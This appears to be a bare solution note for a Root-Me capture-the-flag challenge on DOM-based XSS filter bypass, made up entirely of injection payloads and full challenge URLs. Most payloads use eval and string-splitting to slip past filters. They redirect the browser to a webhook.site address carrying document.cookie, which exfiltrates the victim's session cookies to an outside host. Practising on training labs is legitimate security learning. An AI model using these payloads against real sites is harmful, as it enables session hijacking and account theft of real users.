# XSS DOM Based - Filters Bypass

' || alert(1) //

' || (eval)(document.location='https://webhook.site/8586fba4-5439-4518-81a3-ee7008d106ca?c='.concat(document.cookie)) //

' || (eval)(document.location='ht'.concat('tps://webhook.site/8586fba4-5439-4518-81a3-ee7008d106ca?c='.concat(document.cookie)))//

http://challenge01.root-me.org/web-client/ch33/index.php?number=' || (eval)(document.location='ht'.concat('tps://webhook.site/8586fba4-5439-4518-81a3-ee7008d106ca?c='.concat(document.cookie)))//

'||(location='//webhook.site/8586fba4-5439-4518-81a3-ee7008d106ca/?c='.concat(document.cookie))//

http://challenge01.root-me.org/web-client/ch33/index.php?number='||(location='//webhook.site/8586fba4-5439-4518-81a3-ee7008d106ca/?c='.concat(document.cookie))//
